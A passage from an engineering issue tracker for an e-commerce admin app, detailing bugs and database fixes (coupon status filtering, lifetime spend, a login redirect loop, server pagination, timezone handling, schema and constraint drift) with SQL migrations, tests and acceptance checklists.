5. Keep `deriveStatus` for single-row use (validation in `coupon.service.ts:246-255` depends on it) — but note in a comment that the SQL expression and the JS function must stay in sync, and add a test asserting both produce the same value for a table of fixtures (TEST-003).

**Expected Behavior After Fix:**
The coupon list issues one bounded query regardless of table size. Scheduled coupons display as "Scheduled". Filtering by any status returns correct rows and totals.

**Dependencies:**
- **Related** PERF-004 (pagination), DB-006 (index on `coupons(status/expiry)` — likely unnecessary; evaluate).

**Testing Requirements:**
- Fixture: 5 coupons (active, inactive, scheduled, expired, at-limit) → each filter returns exactly one, totals correct.
- 1,000 coupons → page loads with a bounded query (assert `LIMIT` in the SQL log).
- SQL status equals `deriveStatus` for every fixture.
- `"scheduled"` renders with its own label.

**Acceptance Criteria:**
- [ ] SQL `LIMIT/OFFSET/COUNT`.
- [ ] Status filter applied in SQL.
- [ ] `"scheduled"` representable end-to-end.
- [ ] SQL/JS status parity tested.
- [ ] No full-table read.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-031 — Customer lifetime spend includes unpaid, cancelled-adjacent and refunded orders

**Priority:** P1
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/repositories/customer.repository.ts
```

**Problem Description:**
`totalSpend` sums `orders.total` for every order whose status is not `cancelled`. That includes `awaiting_payment`, `payment_submitted`, `pending` (COD, unpaid) and `refunded`. The figure is presented as "lifetime spend", so it overstates revenue per customer and mis-ranks customers in the list's `sortBy: totalSpend`.

**Current Implementation:**
`src/server/repositories/customer.repository.ts:110` and `:148`:
```ts
totalSpend: sql<number>`cast(coalesce(sum(case when ${orders.status} != 'cancelled' then ${orders.total} else 0 end), 0) as float)`.as("total_spend")
```
`ordersCount` is plain `count(orders.id)` — it also counts unpaid orders.

**Root Cause:**
The predicate was written as "exclude cancelled" (a negative rule) instead of "include settled" (a positive rule), so every future status is included by default.

**Real-World Failure Scenario:**
A hospital account places a PKR 120,000 order and never pays. The customers list ranks it as the top account by spend. Sales calls to "thank" them and offers a loyalty discount based on a number that does not exist. Refunds similarly inflate spend permanently.

**Required Implementation:**

1. Define settled explicitly. Preferred predicate: an order contributes when it has at least one `paid` payment net of refunds:
   ```sql
   CASE WHEN EXISTS (SELECT 1 FROM payments p WHERE p.order_id = orders.id AND p.status = 'paid')
        THEN orders.total ELSE 0 END
   ```
   Simpler alternative if payments are too sparse: `orders.status IN ('confirmed','processing','shipped','delivered')`.
2. Choose **one** and document it. Recommendation: the payments-based predicate, because it survives COD orders (which have no payment row until delivery — see `markOrderPaymentPaid`) and matches "money received". **Caveat:** COD orders paid on delivery will count only after the payment row exists; that is correct.
3. Rename the field or add a second figure: `totalSpend` (settled) plus `totalOrdered` (all non-cancelled) so the UI can show both if desired. Keep `totalSpend` semantics honest.
4. Decide `ordersCount`: recommend counting the same settled set as `ordersCount` and adding `ordersPlaced` for the full set.
5. Update `toCustomerDTO` and the customers page stat strip consistently; do not silently change one and not the other.
6. Add a test fixture covering: unpaid confirmed order, paid order, refunded order, cancelled order, COD paid on delivery.

**Expected Behavior After Fix:**
"Lifetime spend" reflects money actually received, net of refunds, and orders it counts are the same orders whose totals it sums.

**Dependencies:**
- **Related** BUG-029 (DTO honesty), PERF-004 (list aggregates).

**Testing Requirements:**
- Unpaid order → contributes 0.
- Paid order → contributes `total`.
- Fully refunded order → contributes 0.
- Partially refunded order → contributes `total - refunded` (once BUG-010 stores amounts).
- Cancelled → 0.
- `sortBy=totalSpend` ordering matches the new semantics.

**Acceptance Criteria:**
- [ ] Positive "settled" definition implemented.
- [ ] Refunded orders excluded (or netted).
- [ ] Field names honest.
- [ ] UI labels updated accordingly.
- [ ] Fixture tests pass.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-032 — Session redirect loop for authenticated users without a valid role

**Priority:** P1
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/proxy.ts
src/server/auth.ts
src/views/Login.tsx
```

**Problem Description:**
The proxy redirects **any** request carrying a session cookie away from `/login` to `/`. If the cookie is present but the session is invalid (expired, revoked, secret rotated, user banned, or role denied by SEC-004), the server guard redirects `/` back to `/login`, and the proxy bounces it to `/` again — an infinite loop that renders a blank page or the browser's "too many redirects" error.

The current code has two independent sources of this:

1. `getSessionCookie` (`better-auth/cookies`) checks **cookie presence only** — it cannot validate a session at the edge.
2. `requireStaffContext` redirects to `/login` (not `?error=…`) on any failure, and SEC-004 introduces a new failure mode (valid session, invalid role).

**Current Implementation:**
`src/proxy.ts`:
```ts
if (pathname === "/login") {
  if (sessionCookie) return NextResponse.redirect(new URL("/", request.url));
  return NextResponse.next();
}
if (!sessionCookie) { …redirect to /login?from=… }
```
`src/server/auth.ts` `requireStaffContext`: `redirect("/login")` on failure.

**Root Cause:**
Two layers each assume the other validates. The proxy uses a *presence* signal as an *authorization* signal.

**Real-World Failure Scenario:**
The operator rotates `BETTER_AUTH_SECRET` (as SEC-003 requires). Every existing cookie is now cryptographically invalid but still present. Every staff member navigating to `/` gets an infinite redirect chain and cannot reach the login form to sign in again — the app is bricked for everyone until they manually clear cookies.

**Required Implementation:**

1. Make the proxy's `/login` branch permissive: redirect to `/` **only** when the cookie exists **and** the request does not carry an `?error=` marker. Concretely:
   ```ts
   if (pathname === "/login") {
     if (sessionCookie && !request.nextUrl.searchParams.has("error")) {
       return NextResponse.redirect(new URL("/", request.url));
     }
     return NextResponse.next();
   }
   ```
2. Have the server guard redirect to `/login?error=forbidden` (role) or `/login?error=session` (invalid session), never bare `/login`, so the loop can never form.
3. `src/views/Login.tsx` already maps `banned` and `forbidden` to messages; add `session` → "Your session has expired. Please sign in again."
4. Add a `Cache-Control: no-store` on the `/login` response (it is a page, Next handles this; verify).
5. Add a regression test (TEST-005) that simulates: valid cookie + revoked session ⇒ single redirect to `/login`, login form renders, sign-in succeeds.

**Expected Behavior After Fix:**
An invalid-but-present cookie lands on the login page exactly once, with an explanatory message. A valid cookie still skips the login page.

**Dependencies:**
- **Depends on** SEC-004 (introduces the role-denied case).
- **Related** SEC-003 (secret rotation triggers it in practice), SEC-011 (proxy shape).

**Testing Requirements:**
- Valid cookie → `/login` redirects to `/`.
- Cookie present, session deleted server-side → `/` redirects to `/login?error=session`, form renders, no loop.
- Cookie present, `role='customer'` → `/login?error=forbidden`, form renders.
- Banned user → `/login?error=banned`.
- After rotation, sign-in works.

**Acceptance Criteria:**
- [x] `/login` never loops.
- [x] Distinct error codes for session vs role vs ban.
- [x] Login page renders in all failure modes.
- [x] Regression test exists.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### BUG-033 — All list pages fetch a fixed 100 rows and paginate in the browser

**Priority:** P1
**Category:** Bug
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/products/page.tsx
src/app/orders/page.tsx
src/app/customers/page.tsx
src/app/payments/page.tsx
src/app/coupons/page.tsx
src/app/inventory/page.tsx
src/app/customers/[id]/page.tsx
src/views/Products.tsx
src/views/Orders.tsx
src/views/Customers.tsx
src/views/Payments.tsx
src/views/Coupons.tsx
src/views/Inventory.tsx
```

**Problem Description:**
Every list page requests `limit: 100` (`movements: 50`, customer orders: 50) and the views then paginate, sort and filter those 100 rows client-side. Beyond 100 records the UI silently shows a partial dataset with no indication: page 11 of products simply does not exist, and the "total" counters reflect the loaded slice.

**Current Implementation:**
Verified in all seven pages, e.g. `src/app/products/page.tsx:23`, `src/app/orders/page.tsx:23`, `src/app/customers/page.tsx:27`, `src/app/payments/page.tsx:23`, `src/app/coupons/page.tsx:23`, `src/app/inventory/page.tsx:31,33`, `src/app/customers/[id]/page.tsx:47`.
Views then slice: `Products.tsx:92-135` (`filtered`), `Inventory.tsx:139-141` (`pageCount`, `visible = filtered.slice(...)`), etc.

**Root Cause:**
The migration from the mock store kept the "load everything, filter in memory" pattern while capping the payload to protect the RSC response — producing the worst of both: incomplete data *and* large payloads.

**Real-World Failure Scenario:**
The catalog reaches 340 products. The products page shows the 100 most recent; the other 240 cannot be reached by any UI action, so staff believe they were deleted. Inventory is worse: 100 of 900 variants are visible, so restock decisions miss most of the catalog.

**Required Implementation:**

1. Make list pages URL-driven with real server pagination:
   - Read `searchParams`: `page`, `limit` (bounded by the existing Zod `max(100)`), `q`, `sortBy`, `sortOrder`, plus domain filters.
   - Call the service with those values (all repositories already support `page/limit/q/sort`).
   - Pass `items` **and** `pagination` (the existing `PaginatedResult` shape) to the view.
2. Replace the client-side `slice` pagination with a server-driven `Pagination` control that pushes `?page=N&…` (the `src/components/shared/pagination.tsx` component already exists — extend it to emit URL changes rather than callbacks, or add a `mode` prop).
3. Keep the client-side filter *within* the current page only if it aids responsiveness; but the authoritative filter must be the server query (BUG-023 related).
4. Ensure the counts displayed (`total`, "showing X–Y of Z") come from `pagination.totalItems`, not `array.length`.
5. Set `limit` defaults sensibly (20–25) and remove the hardcoded 100.
6. For `inventory`, paginate variants (not products) and keep the summary KPIs server-side (they already are: `getInventorySummary`).
7. Do not change visual design; reuse the existing table/pagination components.

**Expected Behavior After Fix:**
Every list is fully reachable page by page, filters and sorts apply server-side to the whole dataset, and the displayed totals are true.

**Dependencies:**
- **Depends on** BUG-023 (search plumbing) for the `q` portion.
- **Related** PERF-004, PERF-005, PERF-006.

**Testing Requirements:**
- 340 products → 17 pages at `limit=20`, last page correct, "of 340" shown.
- Filter by status reduces totals correctly.
- Sort by name/price persists across pages.
- Deep-link `?page=5` renders page 5 directly.
- Regression: no page changes when data fits in one page.

**Acceptance Criteria:**
- [ ] All list pages read URL pagination/filter params.
- [ ] Services called with real limits.
- [ ] Totals from `pagination`, not array length.
- [ ] Deep links work.
- [ ] No hardcoded `limit: 100` remains.

**Implementation Complexity:** High

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-034 — Layout runs six queries per render with a UTC "today"; dashboard runs sequentially and fakes loading

**Priority:** P1
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/layout.tsx
src/app/page.tsx
src/views/Dashboard.tsx
src/components/shared/use-simulated-loading.ts
```

**Problem Description:**
Three related defects in the shell/dashboard.

(a) **Layout cost.** The root layout runs six database queries on **every page render** (pending orders, pending payments, low stock, today's revenue, recent payments, recent orders) inside a `try/catch` that swallows all errors. The queries run for any authenticated user on any route, so a product edit page pays for dashboard counters.

(b) **Timezone.** "Today's revenue" uses `date(orders.created_at) = current_date` — the database's UTC date. For a Karachi business (UTC+5), the "day" resets at 05:00 local time and yesterday's evening sales land in "today".

(c) **Dashboard loading.** `useSimulatedLoading(400)` deliberately shows a skeleton for 400 ms after data has already arrived (`Dashboard.tsx:95`, `use-simulated-loading.ts`), so the dashboard is *slower by design*. The page also runs its queries sequentially (`src/app/page.tsx:44-88`: five awaits in series).

**Current Implementation:**
`src/app/layout.tsx:55-135` (six `db.select()` calls in `Promise.all`, wrapped in `try { } catch { }`), with `date(${orders.createdAt}) = current_date` at line 88.
`src/app/page.tsx:44-88` sequential awaits.
`src/views/Dashboard.tsx:95`: `const simulatedLoading = useSimulatedLoading(400);`

**Root Cause:**
The layout was used as a convenient place to compute badges (it is the only component that sees every route), without moving the work into a cached, request-scoped function. The timezone was never considered. The simulated loader is prototype scaffolding that shipped.

**Real-World Failure Scenario:**
Every navigation issues six extra round trips (12+ on a cold connection), so the whole admin feels sluggish. Revenue for 21:00–23:59 local time is attributed to the next day, so the "today" card disagrees with the bank statement and with the dashboard chart (which buckets in the browser using local time — another inconsistency).

**Required Implementation:**

1. **Timezone.** Introduce a single constant/module `src/lib/time.ts` exporting `STORE_TIMEZONE = "Asia/Karachi"` and SQL helpers `sqlCurrentDateInStoreTz`, `sqlDayBucket(col, 'day'|'week'|'month')`. Replace `current_date` with `(now() AT TIME ZONE 'Asia/Karachi')::date` and `date(created_at)` with `date(created_at AT TIME ZONE 'Asia/Karachi')`.
2. **Layout cost.** Wrap the six queries in React's `cache()` (or Next's `unstable_cache` with an explicit tag) so they run at most once per request, and move them into a single repository function `getShellSummary()` that issues **two** queries:
   - one combined `SELECT` with scalar subqueries for the four counters (they are all independent and cheap),
   - one `UNION ALL` for the two notification lists (or two `LIMIT 3` selects issued in parallel).
   Target: **≤ 2 queries** per render (down from 6). Record the measured count (§9.6) before and after.
3. Do not silently swallow errors: catch, log with context, and render zeroed badges (current behaviour) **plus** a small "stats unavailable" affordance — or at minimum a structured log line. Never let a failed badge query 500 the page.
4. **Dashboard sequencing.** Replace the five sequential awaits with `Promise.all` (the calls are independent). Target: 1 round-trip wall time instead of 5.
5. **Remove `useSimulatedLoading`** from `Dashboard.tsx` and delete the hook file if no other consumer exists (verified: only Dashboard imports it). Loading state must come from real `loading.tsx` boundaries (which exist) and `useTransition` for period switches.
6. Coordinate with PERF-001/PERF-002, which quantify these targets.

**Expected Behavior After Fix:**
Any page render issues at most two shell queries; the dashboard issues its queries in parallel and shows real skeletons only. "Today" means the Karachi day.

**Dependencies:**
- **Related** PERF-001, PERF-002, BUG-027, BUG-028, ARCH-011.

**Testing Requirements:**
- Count queries per page render (§9.6 harness): `/products` ≤ 2 shell queries.
- At 23:30 Karachi (18:30 UTC), an order created now counts as today.
- At 00:30 Karachi, it counts as the new day.
- Dashboard wall time with 5 parallel queries vs sequential (record, do not invent).
- No skeleton delay when data is already present.

**Acceptance Criteria:**
- [ ] Karachi timezone used for all "today"/bucket logic.
- [ ] Shell summary ≤ 2 queries, request-cached.
- [ ] Dashboard queries parallel.
- [ ] `useSimulatedLoading` removed.
- [ ] Errors logged, page still renders.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

## 6.3 Database Issues

---

### DB-001 — `customers.email` is not unique in SQL but `.unique()` in Drizzle; `upsertCustomer` is not atomic

**Priority:** P0
**Category:** Database
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
supabase/migrations/20261105000000_initial_schema.sql
src/db/schema/customers.ts
src/server/repositories/customer.repository.ts
```

**Problem Description:**
The live schema has a **non-unique** index on `customers.email`:
```sql
CREATE INDEX IF NOT EXISTS idx_customers_email ON customers(email);
```
The Drizzle schema declares `email: text("email").notNull().unique()`. Drizzle therefore *believes* a uniqueness constraint exists that PostgreSQL does not enforce. `upsertCustomer` relies on that belief: it does a `SELECT` then a conditional `INSERT`, with no `ON CONFLICT` and no unique constraint to protect it. Two concurrent order creations for the same new email both find nothing and both insert.

**Current Implementation:**
- SQL: `supabase/migrations/20261105000000_initial_schema.sql:260-266` (table) and `:265` (plain index).
- Drizzle: `src/db/schema/customers.ts:22` — `email: text("email").notNull().unique()`.
- `src/server/repositories/customer.repository.ts:205-260` `upsertCustomer`: `SELECT … WHERE email = normalized`; if found, conditionally `UPDATE`; else `INSERT`. No transaction-level serialization, no `ON CONFLICT`.

**Root Cause:**
The SQL migration created a lookup index (`idx_customers_email`) for search performance, while the Drizzle definition expressed the *intent* of uniqueness. `drizzle-kit generate` was never reconciled against the hand-written SQL, and `db:parity` does not compare index uniqueness.

**Real-World Failure Scenario:**
Two staff members create orders for the same new customer (a hospital's procurement officer) at the same moment. Both transactions see no existing row and insert. The customers list now shows the same person twice with split order history and split lifetime spend. Because there is no unique constraint, nothing detects it — and later attempts to add the constraint fail.

**Required Implementation:**

1. **Detect** duplicates on the target database before changing anything (§8.2 Q1):
   ```sql
   SELECT lower(trim(email)) AS norm_email, count(*) AS n, array_agg(id) AS ids
   FROM customers GROUP BY 1 HAVING count(*) > 1 ORDER BY n DESC;
   ```
   **Prerequisite: production read access. Do not proceed until this returns zero or has been resolved.**
2. **Clean up** (manual, reviewed, one-off): for each duplicate group, choose a survivor (oldest `created_at`, most orders), repoint `orders.customer_id`, `addresses.customer_id`, then delete the losers. Provide the SQL in §8.3 and require a backup before execution.
3. **Add the constraint** with a normalized functional unique index so case/space variants are also caught:
   ```sql
   CREATE UNIQUE INDEX CONCURRENTLY IF NOT EXISTS uq_customers_email_normalized
     ON customers (lower(trim(email)));
   ```
   `CONCURRENTLY` cannot run inside a transaction — the migration runner (`src/db/migrate.ts`) wraps each file in `client.begin(...)`. Therefore this migration must be marked **non-transactional** (see DB-015 for the runner change) or be executed manually per §14.
4. **Align Drizzle** with the SQL: change `src/db/schema/customers.ts` to `text("email").notNull()` and declare `uniqueIndex("uq_customers_email_normalized").on(sql\`lower(trim(${table.email}))\`)`.
5. **Make `upsertCustomer` atomic** regardless of the index: use a single statement
   ```sql
   INSERT INTO customers (email, first_name, last_name, phone, notes)
   VALUES (…)
   ON CONFLICT (lower(trim(email))) DO UPDATE
     SET first_name = COALESCE(customers.first_name, EXCLUDED.first_name),
         last_name  = COALESCE(customers.last_name,  EXCLUDED.last_name),
         phone      = COALESCE(customers.phone,      EXCLUDED.phone),
         updated_at = now()
   RETURNING *;
   ```
   In Drizzle: `.onConflictDoUpdate({ target: sql\`lower(trim(${customers.email}))\`, set: { … } })`. **Note:** `ON CONFLICT` requires an expression index matching the conflict target exactly.
6. Add a parity test (TEST-003 / `npm run db:parity`) that compares unique constraints and indexes between the SQL migrations and the Drizzle definitions.

**Expected Behavior After Fix:**
At most one customer row exists per normalized email; concurrent upserts converge on one row; a parity check fails the build when SQL and Drizzle disagree on uniqueness.

**Dependencies:**
- **Blocks** BUG-001 (customer verification), any customer-facing flow.
- **Related** DB-002 (broader schema reconciliation), DB-015 (runner), DB-016 (index audit).

**Testing Requirements:**
- Duplicate-detection query returns zero after cleanup.
- Index created `CONCURRENTLY` without blocking writes (staging measurement).
- 50 concurrent `upsertCustomer` calls with the same new email → exactly 1 row.
- Case/space variants (`"A@x.com "`, `"a@x.com"`) → same row.
- Parity test fails when the index is dropped and the schema is not updated.

**Acceptance Criteria:**
- [ ] Duplicate audit executed and recorded.
- [ ] Cleanup SQL reviewed and applied with a backup.
- [ ] Unique functional index exists.
- [ ] Drizzle matches SQL.
- [ ] `upsertCustomer` uses `ON CONFLICT`.
- [ ] Concurrency test passes.

**Implementation Complexity:** High

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### DB-002 — SQL and Drizzle disagree on `orders.idempotency_key` uniqueness

**Priority:** P1
**Category:** Database
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
supabase/migrations/20261105000000_initial_schema.sql
src/db/schema/orders.ts
```

**Problem Description:**
SQL declares a **full** unique constraint on a nullable column:
```sql
idempotency_key text UNIQUE,
```
Drizzle declares a **partial** unique index:
```ts
uniqueIndex("uq_orders_idempotency_key").on(table.idempotencyKey).where(sql`${table.idempotencyKey} IS NOT NULL`)
```
Semantically both allow unlimited `NULL`s in PostgreSQL (unique constraints treat NULLs as distinct), so behaviour is equivalent for NULLs — but the *objects* differ, so `drizzle-kit` will attempt to create `uq_orders_idempotency_key` on top of the existing implicit constraint on any future `push`, and the parity script cannot see the difference. Two indexes then exist, doubling write cost.

**Current Implementation:**
SQL line 390; Drizzle `src/db/schema/orders.ts:79-81`.

**Root Cause:**
The partial index was chosen to express "unique when provided", but SQL was written first with a plain `UNIQUE` and the two were never reconciled.

**Real-World Failure Scenario:**
A future `npm run db:generate && db:migrate` adds a second unique index. Writes to `orders` now maintain two identical B-trees. At high order volume this is wasted I/O; more importantly, a future engineer reading Drizzle believes the constraint is partial and could "fix" it by dropping the wrong object.

**Required Implementation:**

1. Choose **one** representation. Recommendation: keep the SQL `UNIQUE` constraint (already deployed, already correct for the semantics) and change Drizzle to `unique("uq_orders_idempotency_key").on(table.idempotencyKey)`.
2. Verify no duplicate indexes exist on the live database (§8.2 Q2):
   ```sql
   SELECT indexname, indexdef FROM pg_indexes WHERE tablename = 'orders' ORDER BY indexname;
   ```
3. If both exist, drop the redundant one **by name** after confirming which backs the constraint (`pg_constraint.conindid`).
4. Record the reconciliation in `docs/ai-context/DATABASE_CONTEXT.md`.

**Expected Behavior After Fix:**
Exactly one unique object guards `idempotency_key`, and SQL/Drizzle describe it identically.

**Dependencies:**
- **Related** DB-001, DB-003, DB-015.

**Testing Requirements:**
- `pg_indexes` shows one entry for the column.
- Idempotent order creation still works (same key returns the existing order).
- Two `NULL` keys allowed.
- Parity test passes.

**Acceptance Criteria:**
- [x] Single unique object.
- [x] Drizzle and SQL agree.
- [x] No duplicate index.
- [x] Idempotency behaviour unchanged.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### DB-003 — Coupon code case-insensitivity is not enforced by the database

**Priority:** P1
**Category:** Database
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
supabase/migrations/20261105000000_initial_schema.sql
src/db/schema/coupons.ts
src/server/repositories/coupon.repository.ts
src/server/services/coupon.service.ts
```

**Problem Description:**
`coupons.code` is `UNIQUE` (case-**sensitive**), and there is a separate **non-unique** index `idx_coupons_code ON coupons(lower(code))`. The application always queries `eq(coupons.code, code.trim().toUpperCase())` and the UI uppercases before saving. Therefore the functional index is never used by these queries (they compare the raw column), and — more importantly — a mixed-case row inserted by any other path (`'welcome10'`) is a *different* coupon from `'WELCOME10'` and would not be found by the lookup.

**Current Implementation:**
- SQL: `code text NOT NULL UNIQUE` and `CREATE INDEX … idx_coupons_code ON coupons(lower(code));`
- Drizzle: `code: text("code").notNull().unique()` plus `index("idx_coupons_code").on(table.code)` — note Drizzle indexes the raw column while SQL indexes `lower(code)`; another drift.
- Queries: `coupon.repository.ts:120-142` `eq(coupons.code, code.trim().toUpperCase())`, including `.for("update")`.

**Root Cause:**
Uppercasing was chosen as the normalisation strategy and pushed into the application. The SQL index and Drizzle index were written at different times by different assumptions (lower vs raw).

**Real-World Failure Scenario:**
Marketing imports 200 codes from a spreadsheet where some cells were lower-case. Those codes are inserted as-is by an admin tool or a direct import. Customers typing `WELCOME10` are told the coupon does not exist. Simultaneously, the unique index permits both `'WELCOME10'` and `'welcome10'` to exist, so the same offer can be redeemed twice with different casing.

**Required Implementation:**

1. Decide the canonical storage form. Recommendation: **store and compare upper-case** (matches the existing write path and UI), and enforce it in the database:
   ```sql
   ALTER TABLE coupons ADD CONSTRAINT chk_coupons_code_upper CHECK (code = upper(code));
   CREATE UNIQUE INDEX CONCURRENTLY IF NOT EXISTS uq_coupons_code_upper ON coupons (upper(code));
   ```
   Or, if lowercase is preferred, switch the app and use `lower(code)`. **Do not** mix.
2. Pre-check for case-variant duplicates (§8.2 Q4):
   ```sql
   SELECT upper(code) AS norm, count(*), array_agg(code) FROM coupons GROUP BY 1 HAVING count(*) > 1;
   ```
3. Clean up by keeping the canonical (uppercase) row and repointing `order_coupons.coupon_id`, then deleting the variant. Preserve `usage_count` by summing into the survivor and documenting it.
4. Align Drizzle `src/db/schema/coupons.ts` with the final choice (`uniqueIndex(...).on(sql\`upper(${table.code})\`)` plus the CHECK).
5. Keep the application-side `.toUpperCase()` — it becomes redundant but harmless (and protects against a future DB change). Add a comment stating the DB is authoritative.
6. Drop the now-redundant `idx_coupons_code` if the unique functional index covers it.

**Expected Behavior After Fix:**
Only one coupon can exist per case-insensitive code. Lookups are index-backed. A mixed-case insert is rejected by the CHECK.

**Dependencies:**
- **Related** DB-001 (same normalisation pattern), DB-016.

**Testing Requirements:**
- Insert `'welcome10'` → CHECK violation.
- Insert duplicate `'WELCOME10'` → unique violation.
- Lookup by lowercase input → finds the coupon (app uppercases).
- `EXPLAIN` shows the unique index used.
- Existing coupons still resolvable after cleanup.

**Acceptance Criteria:**
- [x] Canonical case chosen and enforced by CHECK.
- [x] Unique functional index exists.
- [x] Duplicates audited and cleaned.
- [x] Drizzle matches SQL.
- [x] Lookups are index-backed.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### DB-004 — Drizzle defines CHECK constraints that SQL never creates

**Priority:** P1
**Category:** Database
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/db/schema/inventory.ts
src/db/schema/shipping.ts
supabase/migrations/20261105000000_initial_schema.sql
supabase/migrations/20261105000001_phase3_schema_refinements.sql
```

**Problem Description:**
Two Drizzle files declare CHECK constraints that do not exist in the SQL migrations:
- `src/db/schema/inventory.ts:63-66`: `chk_inventory_movements_reason` — `reason IN ('restock','sale','cancellation','adjustment','return')`.
- `src/db/schema/shipping.ts:49-56`: `chk_shipping_methods_estimated_days`, `chk_shipping_methods_min_days`, `chk_shipping_methods_max_days` — non-negative day values.

The live database therefore accepts any `reason` string and negative day values. The application is the only thing enforcing these rules, which contradicts ADR 011 ("Supabase SQL migrations are the single source of truth" + DB-level invariants).

**Current Implementation:**
SQL `inventory_movements` table (`initial_schema.sql:519-536`) has no CHECK on `reason`; `shipping_methods` (`:294-313`) has no CHECK on the day columns. `phase3_schema_refinements.sql` adds `is_featured`, `min_days`, `max_days`, `supports_proof` — again without CHECKs.

**Root Cause:**
The Drizzle schema was written as the intended design; the hand-written SQL migration lagged behind and was never diffed. `npm run db:parity` evidently does not compare CHECK constraints.

**Real-World Failure Scenario:**
A future integration (or a manual `UPDATE`) writes `reason = 'restock '` (trailing space) or `'RETURN'`. The movement ledger now contains values the application's `inventoryMovementReasonEnum` cannot parse; the inventory history UI silently drops those rows, so stock appears to change without a recorded reason.

**Required Implementation:**

1. Add the missing CHECKs in a new migration (DB-015 ordering):
   ```sql
   ALTER TABLE inventory_movements
     ADD CONSTRAINT chk_inventory_movements_reason
     CHECK (reason IN ('restock','sale','cancellation','adjustment','return'));
   ALTER TABLE shipping_methods
     ADD CONSTRAINT chk_shipping_methods_days CHECK (
       (estimated_days IS NULL OR estimated_days >= 0) AND
       (min_days IS NULL OR min_days >= 0) AND
       (max_days IS NULL OR max_days >= 0) AND
       (min_days IS NULL OR max_days IS NULL OR max_days >= min_days)
     );
   ```
   Use `NOT VALID` first, then `VALIDATE CONSTRAINT` in a second statement so existing rows are checked without a long table lock (see §8.5).
2. Pre-check for violating rows (§8.2 Q5) — required before `VALIDATE`:
   ```sql
   SELECT DISTINCT reason FROM inventory_movements
   WHERE reason NOT IN ('restock','sale','cancellation','adjustment','return');
   SELECT id FROM shipping_methods WHERE estimated_days < 0 OR min_days < 0 OR max_days < 0 OR max_days < min_days;
   ```
3. Map any offender to a canonical value with a documented `UPDATE` (never delete ledger rows).
4. Extend `npm run db:parity` to compare CHECK constraint definitions.

**Expected Behavior After Fix:**
The database rejects invalid movement reasons and negative/incoherent day ranges. A row can no longer exist that the application cannot interpret.

**Dependencies:**
- **Related** DB-002, DB-016, DB-015 (migration ordering).

**Testing Requirements:**
- Insert `reason='bogus'` → constraint violation.
- Insert `reason='RETURN'` → violation (case-sensitive enum).
- `shipping_methods` with `min_days=5, max_days=2` → violation.
- Existing valid rows unaffected.
- Parity test detects a dropped CHECK.

**Acceptance Criteria:**
- [x] Both CHECKs exist in SQL.
- [x] Pre-check queries executed and clean.
- [x] `VALIDATE CONSTRAINT` succeeds.
- [x] Drizzle already matches.
- [x] Parity script extended.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### DB-005 — No refund amount is stored anywhere

**Priority:** P1
**Category:** Database
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
supabase/migrations/20261105000000_initial_schema.sql
src/db/schema/payments.ts
src/server/services/payment.service.ts
src/server/validation/payments.ts
```

**Problem Description:**
`payments` has no refund columns. A refund is represented only by `status = 'refunded'` and a free-text `rejection_reason`-adjacent note. Partial refunds are impossible to represent (BUG-010) and totals cannot be reconciled.

**Current Implementation:**
`payments` columns (SQL `:491-514`): `status, amount, currency, sender_name, sender_account_last4, transaction_reference, proof_url, provider_payment_id, metadata, verified_by, verified_at, rejection_reason, paid_at, created_at, updated_at`. No `refund_amount`, `refunded_at`, `refunded_by`.
`RefundPaymentInput` = `{ paymentId, reason }` (`src/server/validation/payments.ts`).

**Root Cause:**
Refunds were modelled as a status transition rather than a financial event with an amount and an actor.

**Real-World Failure Scenario:**
A customer is charged PKR 5,300 and refunded PKR 2,000 as a goodwill gesture. The row shows `status='refunded'` and `amount=5300`. Any revenue report that subtracts refunded amounts overstates the refund by 3,300 — or, if it excludes refunded rows entirely, hides the 2,000 that actually left the business.

**Required Implementation:**

1. Migration (DB-015 ordering, additive, non-destructive):
   ```sql
   ALTER TABLE payments
     ADD COLUMN IF NOT EXISTS refund_amount numeric(12,2)
       CHECK (refund_amount IS NULL OR (refund_amount > 0 AND refund_amount <= amount)),
     ADD COLUMN IF NOT EXISTS refunded_at timestamptz,
     ADD COLUMN IF NOT EXISTS refunded_by text REFERENCES ba_user(id) ON DELETE SET NULL;
   ```
   `ADD COLUMN` with only nullable columns and a CHECK that validates new rows is fast (`ACCESS EXCLUSIVE` for a few ms). For a large table, add the CHECK as `NOT VALID` then `VALIDATE CONSTRAINT` (§8.5).
2. Support multiple partial refunds without a new table by storing the **cumulative** refund on the payment (`refund_amount` = total refunded to date) and keeping per-event detail in `metadata.refunds[] = [{ amount, reason, by, at }]`. Document the choice; a dedicated `payment_refunds` table is the alternative and should be recorded as a future option, not implemented now (Safety Rule 8/14).
3. Update `src/db/schema/payments.ts` to match.
4. Extend `refundPaymentSchema` with `refundAmount` and `restock` (BUG-010).
5. Backfill: existing `status='refunded'` rows get `refund_amount = amount`, `refunded_at = updated_at`, `refunded_by = verified_by` — an approximation, documented as such in the migration comment.

**Expected Behavior After Fix:**
